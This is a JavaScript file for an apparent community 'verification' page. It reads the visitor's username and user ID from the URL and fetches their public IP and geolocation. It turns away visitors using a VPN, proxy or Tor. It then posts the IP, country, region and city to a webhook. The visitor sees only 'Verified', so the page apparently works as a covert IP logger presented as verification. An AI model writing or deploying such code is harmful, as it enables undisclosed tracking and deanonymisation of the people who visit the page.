(function() {
  const statusDiv = document.getElementById('status');

  // Get query parameters from the URL
  function getQueryParams() {
    const params = new URLSearchParams(window.location.search);
    return {
      username: params.get('username') || 'Not provided',
      userid: params.get('userid') || 'Not provided',
      displayName: params.get('user_display_name') || 'Not provided'
    };
  }

  // Perform the verification process
  async function performVerification() {
    if (localStorage.getItem('hasVerified') === 'true') {
      statusDiv.textContent = 'You have already been verified.';
      return;
    }

    try {
      const { username, userid, displayName } = getQueryParams();

      // Fetch IP address
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const { ip } = await ipResponse.json();

      // Fetch VPN info based on IP address
      const vpnResponse = await fetch(`https://vpnapi.io/api/${ip}?key=${window.config.vpnApiKey}`);
      const vpnData = await vpnResponse.json();

      // Check if the user is using a VPN
      const isUsingVPN = vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor;
      if (isUsingVPN) {
        statusDiv.textContent = 'Verification failed, please turn off your VPN.';
        return;
      }

      // Create an embed for the webhook message
      const embed = {
        title: 'New Verification Attempt',
        color: 3447003,
        fields: [
          { name: 'Username', value: username, inline: true },
          { name: 'User ID', value: userid, inline: true },
          { name: 'Display Name', value: displayName, inline: true },
          { name: '\u200B', value: '\u200B', inline: false },
          { name: 'IP Address', value: ip, inline: true },
          { name: 'Country', value: (vpnData.location && vpnData.location.country) || 'Unknown', inline: true },
          { name: 'Region', value: (vpnData.location && vpnData.location.region) || 'Unknown', inline: true },
          { name: 'City', value: (vpnData.location && vpnData.location.city) || 'Unknown', inline: true }
        ],
        footer: { text: 'catboys4.life' }
      };

      // Send webhook request
      await fetch(window.config.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
      });

      // Mark the user as verified in local storage
      localStorage.setItem('hasVerified', 'true');
      statusDiv.textContent = 'Verified';

    } catch (err) {
      console.error(err);
      statusDiv.textContent = 'An error occurred during verification.';
    }
  }

  // Perform verification after a brief delay
  setTimeout(performVerification, 1000);
})();
